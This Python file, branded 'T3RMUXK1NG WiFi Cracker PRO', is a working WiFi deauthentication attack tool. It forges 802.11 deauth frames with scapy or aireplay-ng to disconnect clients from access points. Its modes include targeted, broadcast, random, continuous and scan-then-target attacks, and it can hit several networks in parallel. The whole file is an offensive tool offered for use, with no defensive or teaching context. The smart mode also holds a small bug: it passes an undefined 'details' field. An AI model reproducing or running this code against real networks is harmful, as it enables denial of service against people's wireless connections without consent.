#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
T3RMUXK1NG WiFi Cracker PRO - Deauthentication Attack Module
WiFi deauthentication attack suite
"""

import os
import time
import random
import subprocess
import threading
from typing import List, Dict, Optional
from dataclasses import dataclass
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Try to import scapy
try:
    from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp, Ether
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


@dataclass
class DeauthResult:
    """Deauth attack result"""
    success: bool
    bssid: str
    client: str
    packets_sent: int = 0
    duration: float = 0.0
    error: str = ""


class DeauthAttacker:
    """Deauthentication Attack Engine"""
    
    # Broadcast MAC
    BROADCAST = "FF:FF:FF:FF:FF:FF"
    
    def __init__(self, interface: str):
        self.interface = interface
        self.process = None
        self.running = False
        self.packets_sent = 0
        self.start_time = None
        self.stats = {
            'attacks_launched': 0,
            'packets_sent': 0,
            'clients_deauthed': 0
        }
    
    def attack(self, bssid: str, mode: str = "broadcast", count: int = 10,
               client: str = None, interval: float = 0.1) -> DeauthResult:
        """Execute deauth attack"""
        self.stats['attacks_launched'] += 1
        self.running = True
        self.packets_sent = 0
        self.start_time = time.time()
        
        if mode == "targeted" and client:
            result = self._deauth_targeted(bssid, client, count)
        elif mode == "broadcast":
            result = self._deauth_broadcast(bssid, count)
        elif mode == "random":
            result = self._deauth_random(bssid, count)
        elif mode == "persistent":
            result = self._deauth_persistent(bssid, interval)
        elif mode == "smart":
            result = self._deauth_smart(bssid, count)
        else:
            result = DeauthResult(
                success=False, bssid=bssid, client=client or self.BROADCAST,
                error="Unknown mode"
            )
        
        result.duration = time.time() - self.start_time
        self.stats['packets_sent'] += result.packets_sent
        
        return result
    
    def _deauth_targeted(self, bssid: str, client: str, count: int) -> DeauthResult:
        """Deauth specific client"""
        return self._send_deauth(bssid, client, count)
    
    def _deauth_broadcast(self, bssid: str, count: int) -> DeauthResult:
        """Deauth all clients"""
        return self._send_deauth(bssid, self.BROADCAST, count)
    
    def _deauth_random(self, bssid: str, count: int) -> DeauthResult:
        """Deauth random clients"""
        total_packets = 0
        
        # Generate random client MACs
        for _ in range(count):
            random_mac = self._generate_random_mac()
            result = self._send_deauth(bssid, random_mac, 1)
            total_packets += result.packets_sent
        
        return DeauthResult(
            success=True, bssid=bssid, client="random",
            packets_sent=total_packets
        )
    
    def _deauth_persistent(self, bssid: str, interval: float) -> DeauthResult:
        """Continuous deauth"""
        self.packets_sent = 0
        
        while self.running:
            result = self._send_deauth(bssid, self.BROADCAST, 1)
            self.packets_sent += result.packets_sent
            time.sleep(interval)
        
        return DeauthResult(
            success=True, bssid=bssid, client=self.BROADCAST,
            packets_sent=self.packets_sent
        )
    
    def _deauth_smart(self, bssid: str, count: int) -> DeauthResult:
        """Smart deauth - find and target connected clients"""
        # Scan for connected clients first
        clients = self._scan_clients(bssid)
        
        if not clients:
            # Fall back to broadcast
            return self._deauth_broadcast(bssid, count)
        
        total_packets = 0
        
        # Deauth each found client
        for client in clients:
            result = self._send_deauth(bssid, client, count // len(clients) + 1)
            total_packets += result.packets_sent
            self.stats['clients_deauthed'] += 1
        
        return DeauthResult(
            success=True, bssid=bssid, client="smart",
            packets_sent=total_packets,
            details={'clients_targeted': clients}
        )
    
    def _send_deauth(self, bssid: str, client: str, count: int) -> DeauthResult:
        """Send deauth packets"""
        if SCAPY_AVAILABLE:
            return self._send_deauth_scapy(bssid, client, count)
        else:
            return self._send_deauth_aireplay(bssid, client, count)
    
    def _send_deauth_scapy(self, bssid: str, client: str, count: int) -> DeauthResult:
        """Send deauth using scapy"""
        try:
            # Create deauth packet
            packet = RadioTap() / Dot11(
                addr1=client,
                addr2=bssid,
                addr3=bssid
            ) / Dot11Deauth(reason=7)
            
            # Send packets
            sendp(packet, iface=self.interface, count=count, 
                  verbose=False, inter=0.1)
            
            return DeauthResult(
                success=True, bssid=bssid, client=client,
                packets_sent=count
            )
            
        except Exception as e:
            return DeauthResult(
                success=False, bssid=bssid, client=client,
                error=str(e)
            )
    
    def _send_deauth_aireplay(self, bssid: str, client: str, count: int) -> DeauthResult:
        """Send deauth using aireplay-ng"""
        try:
            cmd = [
                'sudo', 'aireplay-ng',
                '--deauth', str(count),
                '-a', bssid,
                '-c', client,
                self.interface
            ]
            
            self.process = subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            
            self.process.wait(timeout=30)
            
            return DeauthResult(
                success=True, bssid=bssid, client=client,
                packets_sent=count
            )
            
        except subprocess.TimeoutExpired:
            self.process.terminate()
            return DeauthResult(
                success=True, bssid=bssid, client=client,
                packets_sent=count,
                error="Timeout (but packets may have been sent)"
            )
        except FileNotFoundError:
            return DeauthResult(
                success=False, bssid=bssid, client=client,
                error="aireplay-ng not found"
            )
        except Exception as e:
            return DeauthResult(
                success=False, bssid=bssid, client=client,
                error=str(e)
            )
    
    def _scan_clients(self, bssid: str, duration: int = 10) -> List[str]:
        """Scan for connected clients"""
        clients = []
        
        try:
            # Use airodump-ng to find clients
            output_file = f"/tmp/deauth_scan_{int(time.time())}"
            
            cmd = [
                'sudo', 'airodump-ng', self.interface,
                '--bssid', bssid,
                '-w', output_file,
                '--output-format', 'csv'
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            time.sleep(duration)
            process.terminate()
            
            # Parse CSV for clients
            csv_file = f"{output_file}-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, 'r') as f:
                    content = f.read()
                    lines = content.split('\n')
                    
                    in_clients = False
                    for line in lines:
                        if 'Station MAC' in line:
                            in_clients = True
                            continue
                        
                        if in_clients and line.strip():
                            parts = line.split(',')
                            if len(parts) >= 6:
                                client_mac = parts[0].strip()
                                client_bssid = parts[5].strip()
                                
                                if client_bssid == bssid and client_mac:
                                    clients.append(client_mac)
                
                os.remove(csv_file)
            
        except Exception as e:
            pass
        
        return clients
    
    def _generate_random_mac(self) -> str:
        """Generate random MAC address"""
        mac = [0x00, 0x16, 0x3e,
               random.randint(0x00, 0x7f),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff)]
        
        return ':'.join(map(lambda x: "%02x" % x, mac))
    
    def deauth_multiple(self, targets: List[str], count: int = 10) -> Dict[str, DeauthResult]:
        """Deauth multiple APs"""
        results = {}
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {
                executor.submit(self.attack, bssid, "broadcast", count): bssid
                for bssid in targets
            }
            
            for future in futures:
                result = future.result()
                results[result.bssid] = result
        
        return results
    
    def stop(self):
        """Stop ongoing attack"""
        self.running = False
        if self.process:
            self.process.terminate()
    
    def get_stats(self) -> Dict:
        """Get attack statistics"""
        return self.stats.copy()


if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: python deauth.py <interface> <bssid> [count] [client]")
        sys.exit(1)
    
    interface = sys.argv[1]
    bssid = sys.argv[2]
    count = int(sys.argv[3]) if len(sys.argv) > 3 else 10
    client = sys.argv[4] if len(sys.argv) > 4 else None
    
    attacker = DeauthAttacker(interface)
    
    mode = "targeted" if client else "broadcast"
    print(f"Sending {count} deauth packets to {bssid}...")
    
    result = attacker.attack(bssid, mode, count, client)
    
    if result.success:
        print(f"Sent {result.packets_sent} packets")
    else:
        print(f"Failed: {result.error}")
